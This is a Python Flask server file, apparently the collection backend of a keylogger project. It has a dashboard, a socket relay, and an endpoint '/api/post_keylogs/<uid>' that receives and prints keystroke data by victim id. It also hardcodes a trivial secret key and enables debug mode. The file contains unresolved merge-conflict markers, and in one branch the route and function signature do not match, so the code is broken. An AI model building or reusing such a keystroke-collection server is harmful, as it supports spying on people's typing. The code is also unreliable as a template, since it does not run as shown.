from flask import Flask, jsonify, request
from flask import render_template
from flask_socketio import SocketIO, emit

from decimal import *

# import simplejson
# https://flask-socketio.readthedocs.io/en/latest/
# https://github.com/socketio/socket.io-client

app = Flask(__name__)

app.config['SECRET_KEY'] = 'secretKey'
socketio = SocketIO(app)


@app.route('/')
def cover():
    return render_template('index.html')


@app.route('/dashboard')
def dash():
    return render_template('dashboard/index.html')


def messageRecived():
    print('message was received-----!!!')


@socketio.on('my event')
def handle_my_custom_event(json):
    #print('received my event: ' + str(json))
    socketio.emit('my response', json, callback=messageRecived)


# @app.route('/api/post_klogs/<uid>', methods=['POST'])
<<<<<<< HEAD
@app.route('/api/post_keylogs/<uid>', methods=['POST'])
=======
@app.route('/api/post_keylogs/', methods=['GET', 'POST'])
>>>>>>> 99f07579c35edbb20b49c2b4407806af3292d7f7
def add_message(uid):
    """
    check if valid uid, next of true
    :param uid:
    :return:
    """
    # import pdb; pdb.set_trace()
    # content = request.json
<<<<<<< HEAD
    print uid
    print request.json
    return jsonify({"uuid":uid})




=======
    print request.data
    # print content
    return jsonify({"uuid": uid})
>>>>>>> 99f07579c35edbb20b49c2b4407806af3292d7f7


if __name__ == "__main__":
    app.debug = True
    socketio.run(app)